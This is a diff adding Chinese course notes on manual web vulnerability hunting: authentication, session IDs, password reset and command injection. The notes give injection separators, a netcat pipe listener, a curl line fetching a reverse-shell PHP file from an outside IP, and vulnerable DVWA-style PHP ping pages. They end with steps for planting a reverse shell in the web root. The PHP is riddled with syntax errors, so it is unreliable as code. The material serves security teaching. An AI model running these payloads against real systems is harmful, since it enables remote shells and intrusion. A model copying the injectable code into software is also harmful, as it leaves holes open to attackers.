@@ -1,0 +1,148 @@
+课时85 手动漏洞挖掘（二）
+
+手动漏洞挖掘
+身份认证
+    常用弱口令/基于字典的密码破爆破
+    锁定账号
+    信息收集
+        手机号
+        密码错误提示信息
+    密码嗅探
+
+手动漏洞挖掘
+会话sessionID
+    Xss / cookie importer
+    SessionID in URL
+    嗅探
+    sessionID长期不变 / 永久不变
+    sessionID生成算法
+        Sequencer
+        私有算法
+        预判下一次登录时生成的SessionID
+        登出后返回测试
+
+手动漏洞挖掘
+密码找回
+    https://www.example.com/reset?email=user@example.com&example.com&key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0elcclffc5e475514
+
+手动漏洞挖掘
+漏洞挖掘原则
+    所有变量
+    所有头
+        Cookie中变量
+    逐个变量删除
+
+手动漏洞挖掘
+漏洞的本质
+   数据与指令的混淆
+   对用户输入信息过滤不严判断失误，误将指令当数据
+
+命令执行
+    应用程序开发者直接调用操作系统功能
+     ；  &&   |     ||    &
+    查看源码，过滤用户输入
+    ;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 > /tmp/pipe
+;curl http://1.1.1.1/php-revers-shell.php
+
+root@kali:~# ping -c 1 192.168.1.1;ls;pwd:ud  
+
+-----------------------------------------------------------------------------------------
+<?php
+
+if( isset( $_POST[ 'submit' ] ) ) {
+
+    $target = $_REQUEST [ 'ip' ]';
+
+    // Determine OS and execute the ping command
+    if (stristr(php_uname('s').'Windows NT')){
+ 
+        $cmd = shell_exec ( 'ping' . $target);
+        echo '<pre>'.$cmd.'</pre>';
+    }else {
+
+        $cmd =shell_exec( 'ping -c 3 ' .$target );
+        echo '<pre>.$cmd.'<.pre>';
+
+    }
+
+}
+?>
+
+-----------------------------------------------------------------------------------
+
+<?php
+
+if( isset( $_POST[ 'submit' ] ) ) {
+
+    $target = $_REQUEST [ 'ip' ]';
+
+    // Remove any of the characters in the arry (blacklist).
+    $substitutions = array(
+        '&&' => ''.
+        ':' => ''.
+    );
+
+    $target = str_replace ( array_keys( $substitutions ).$substitutions. $target );
+
+    // Determine OS and execute the ping command
+    if(stristr(php_uname('s'),'Windows NT')) {
+
+        $cmd = shell_exec( 'ping ' . $target );
+        echo '<pre>'.$cmd.'</pre>';
+
+    } else {
+
+        $cmd = shell_exec( 'ping -c 3 ' .$target );
+        echo '<pre>.$cmd.'<.pre>';
+
+    }
+
+}
+?>
+---------------------------------------------------------------------------------------------
+
+
+<?php
+
+if( isset( $_POST[ 'submit' ] ) ) {
+
+    $target = $_REQUEST [ 'ip' ]';
+
+    $target = stripslashes ( $target );
+
+    // Split the IP into 4 octects
+    $octests = explode(".". $target);
+
+    // Check IF each octet is an integer
+    if ((is_numeric($octet[0])) && (is_numeric($octet[1])) && (is_numeric($octet[2])) && (is_numeric($octet[3])
+
+    // if all 4 octets are int's put the IP back together.
+    $target = $octet[0].'.'.$octet[1].'.'.$octet[2].'.'.$octet[3];
+
+    // Determine OS and execute the ping command
+    if(stristr(php_uname('s'),'Windows NT')) {
+
+        $cmd = shell_exec( 'ping ' . $target );
+        echo '<pre>'.$cmd.'</pre>';
+
+    } else {
+
+        $cmd = shell_exec( 'ping -c 3 ' .$target );
+        echo '<pre>.$cmd.'<.pre>';
+
+    }
+
+    else {
+
+        echo '<pre>ERROR: You have entered an invalid IP </pre>';
+    }
+
+}
+-----------------------------------------------------------------
+root@kali:~#  cp /usr/share/webshells/php/php-reverse-shell.php /var/www/html/1.php
+
+root@kali:~# cd /var/www/html/
+
+root@kali:~/var/www/html# ls
+1.php  index.html
+
